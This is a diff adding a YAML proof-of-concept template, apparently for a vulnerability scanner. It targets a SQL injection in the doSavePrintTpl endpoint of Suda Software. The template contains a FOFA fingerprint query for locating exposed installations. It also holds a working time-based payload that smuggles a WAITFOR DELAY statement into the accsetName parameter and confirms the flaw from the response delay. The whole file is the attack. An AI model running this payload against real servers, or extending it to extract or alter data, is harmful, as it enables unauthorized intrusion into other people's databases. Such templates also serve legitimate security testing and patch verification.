@@ -1,0 +1,18 @@
+id: poc-yaml-suda-software-dosaveprinttpl-sqli
+info:
+  name: 速达软件 doSavePrintTpl SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 速达软件
+  fofa: body="速达软件技术"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--&modId=1
+  expression: status_code == 200 && contains(body,"WAITFOR DELAY") && contains(content_type,"application/json")
+    && !contains(body,"<") && duration > t1 && duration < t2
+transport: http
